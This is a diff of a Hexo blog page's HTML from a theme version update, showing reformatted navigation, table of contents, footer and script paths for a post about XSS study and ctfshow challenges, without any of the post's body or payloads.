+				<a href="/tags/Web/">#Web</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
-        
+		
 
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">BUU平台的Pwn题记录</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">BUU平台的Web题记录</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">BUU平台的Pwn题记录</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">BUU平台的Web题记录</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
 
 
-        
-            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-                <div class="comments-container mt-10 w-full ">
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
     <div id="comment-anchor" class="w-full h-2.5"></div>
     <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
         Comments
@@ -856,36 +847,30 @@
     
 </div>
 
-            </div>
-        
-    </div>
+		</div>
+		
+	</div>
 
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">XSS学习</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">2.</span> <span class="nav-text">攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM%E5%9E%8BXSS%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">DOM型XSS： </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9AinnerHTML"><span class="nav-number">2.1.1.</span> <span class="nav-text">场景一：innerHTML</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E8%B7%B3%E8%BD%AC"><span class="nav-number">2.1.2.</span> <span class="nav-text">场景二：跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%EF%BC%9Aeval"><span class="nav-number">2.1.3.</span> <span class="nav-text">场景三：eval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E5%9B%9B%EF%BC%9Acookie%E3%80%81referer"><span class="nav-number">2.1.4.</span> <span class="nav-text">场景四：cookie、referer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%94%EF%BC%9Adocument-write%E3%80%81document-URL-indexOf-%E2%80%9Cid-%E2%80%9D"><span class="nav-number">2.1.5.</span> <span class="nav-text">场景五：document.write、document.URL.indexOf(“id&#x3D;”)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xss-payload"><span class="nav-number">2.1.6.</span> <span class="nav-text">Xss payload </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="nav-number">2.1.7.</span> <span class="nav-text">1.无过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%87%E6%BB%A4script"><span class="nav-number">2.1.8.</span> <span class="nav-text">2.过滤script</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%AD%98%E5%82%A8%E5%9E%8BXss-payload%EF%BC%9A"><span class="nav-number">2.1.9.</span> <span class="nav-text">3.存储型Xss payload：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A5ctfshow-xss-web328%E4%B8%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">以ctfshow xss web328为例：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E4%BA%8E%E7%99%BB%E5%BD%95Cookie%E5%B0%B1%E5%A4%B1%E6%95%88%E7%9A%84%EF%BC%8C%E6%97%A0%E6%B3%95%E4%BC%AA%E9%80%A0cookie%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">对于登录Cookie就失效的，无法伪造cookie：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E5%A4%96%E5%B8%A6%E4%BF%A1%E6%81%AFpayload%EF%BC%9A%EF%BC%88%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">法一：外带信息payload：（监听端口）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9AjQuery-%E9%80%89%E6%8B%A9%E5%99%A8%E6%9F%A5%E6%89%BE%E7%B1%BB%E5%92%8C%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9%E3%80%82"><span class="nav-number">3.1.2.</span> <span class="nav-text">法二：jQuery 选择器查找类和获取内容。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web329-payload"><span class="nav-number">4.</span> <span class="nav-text">web329 payload:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web330-payload%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">web330 payload：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-331-payload%EF%BC%9A"><span class="nav-number">6.</span> <span class="nav-text">web 331 payload：</span></a></li></ol>
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">XSS学习</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">2.</span> <span class="nav-text">攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM%E5%9E%8BXSS%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">DOM型XSS：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9AinnerHTML"><span class="nav-number">2.1.1.</span> <span class="nav-text">场景一：innerHTML</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E8%B7%B3%E8%BD%AC"><span class="nav-number">2.1.2.</span> <span class="nav-text">场景二：跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%EF%BC%9Aeval"><span class="nav-number">2.1.3.</span> <span class="nav-text">场景三：eval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E5%9B%9B%EF%BC%9Acookie%E3%80%81referer"><span class="nav-number">2.1.4.</span> <span class="nav-text">场景四：cookie、referer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%94%EF%BC%9Adocument-write%E3%80%81document-URL-indexOf-%E2%80%9Cid-%E2%80%9D"><span class="nav-number">2.1.5.</span> <span class="nav-text">场景五：document.write、document.URL.indexOf(“id&#x3D;”)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xss-payload"><span class="nav-number">2.1.6.</span> <span class="nav-text">Xss payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="nav-number">2.1.7.</span> <span class="nav-text">1.无过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%87%E6%BB%A4script"><span class="nav-number">2.1.8.</span> <span class="nav-text">2.过滤script</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%AD%98%E5%82%A8%E5%9E%8BXss-payload%EF%BC%9A"><span class="nav-number">2.1.9.</span> <span class="nav-text">3.存储型Xss payload：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A5ctfshow-xss-web328%E4%B8%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">以ctfshow xss web328为例：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E4%BA%8E%E7%99%BB%E5%BD%95Cookie%E5%B0%B1%E5%A4%B1%E6%95%88%E7%9A%84%EF%BC%8C%E6%97%A0%E6%B3%95%E4%BC%AA%E9%80%A0cookie%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">对于登录Cookie就失效的，无法伪造cookie：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E5%A4%96%E5%B8%A6%E4%BF%A1%E6%81%AFpayload%EF%BC%9A%EF%BC%88%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">法一：外带信息payload：（监听端口）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9AjQuery-%E9%80%89%E6%8B%A9%E5%99%A8%E6%9F%A5%E6%89%BE%E7%B1%BB%E5%92%8C%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9%E3%80%82"><span class="nav-number">3.1.2.</span> <span class="nav-text">法二：jQuery 选择器查找类和获取内容。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web329-payload"><span class="nav-number">4.</span> <span class="nav-text">web329 payload:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web330-payload%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">web330 payload：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-331-payload%EF%BC%9A"><span class="nav-number">6.</span> <span class="nav-text">web 331 payload：</span></a></li></ol>
 
-    </div>
+	</div>
 </div>
-        </div>
-    
+	</div>
+	
 </div>
+			</div>
 
+			
+		</div>
 
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
     <div class="info-container py-3 text-center">
         
         <div class="text-center">
@@ -924,7 +909,7 @@
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
             <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
         </div>
         
         
@@ -953,124 +938,113 @@
         
     </div>  
 </footer>
-        </div>
-    </div>
+		</div>
+	</div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
 
-        <!-- go comment -->
-        
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
 </div>
 
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
 </div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
-        <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-          <span class="search-input-field-pre">
-            <i class="fa-solid fa-keyboard"></i>
-          </span>
-            <div class="search-input-container">
-                <input autocomplete="off"
-                       autocorrect="off"
-                       autocapitalize="off"
-                       placeholder="Search..."
-                       spellcheck="false"
-                       type="search"
-                       class="search-input"
-                >
-            </div>
-            <span class="popup-btn-close">
-                <i class="fa-solid fa-times"></i>
-            </span>
-        </div>
-        <div id="search-result">
-            <div id="no-result">
-                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
-            </div>
-        </div>
-    </div>
-</div>
-
-    
+	
 
 </main>
 
 
-    
-<script src="/js/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
+<script src="/js/build/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
 
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
 
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
 
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
 
 <script>
     const swup = new Swup({
@@ -1094,48 +1068,46 @@
 
 
 
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
 
+<script src="/js/build/utils.js" type="module"></script>
 
+<script src="/js/build/main.js" type="module"></script>
 
-<script src="/js/tools/imageViewer.js" type="module"></script>
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
 
-<script src="/js/utils.js" type="module"></script>
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
 
-<script src="/js/main.js" type="module"></script>
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
 
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
 
 
 
     
-<script src="/js/tools/localSearch.js" type="module"></script>
+<script src="/js/build/tools/localSearch.js" type="module"></script>
 
 
 
 
     
-<script src="/js/tools/codeBlock.js" type="module"></script>
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
 
 
 
 
     
-<script src="/js/layouts/lazyload.js" type="module"></script>
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
 
 
 
 
     
-<script src="/js/tools/runtime.js"></script>
+<script src="/js/build/tools/runtime.js"></script>
 
     
-<script src="/js/libs/odometer.min.js"></script>
+<script src="/js/build/libs/odometer.min.js"></script>
 
     
 <link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
@@ -1144,10 +1116,10 @@
 
 
   
-<script src="/js/libs/Typed.min.js"></script>
+<script src="/js/build/libs/Typed.min.js"></script>
 
   
-<script src="/js/plugins/typed.js" type="module"></script>
+<script src="/js/build/plugins/typed.js" type="module"></script>
 
 
 
@@ -1157,18 +1129,28 @@
 
 
 
-<div class="post-scripts" data-swup-reload-script>
-    
-        
-<script src="/js/tools/tocToggle.js" type="module"></script>
 
-<script src="/js/layouts/toc.js" type="module"></script>
-
-<script src="/js/plugins/tabs.js" type="module"></script>
 
     
-</div>
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
 
 
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
 </body>
+
 </html>
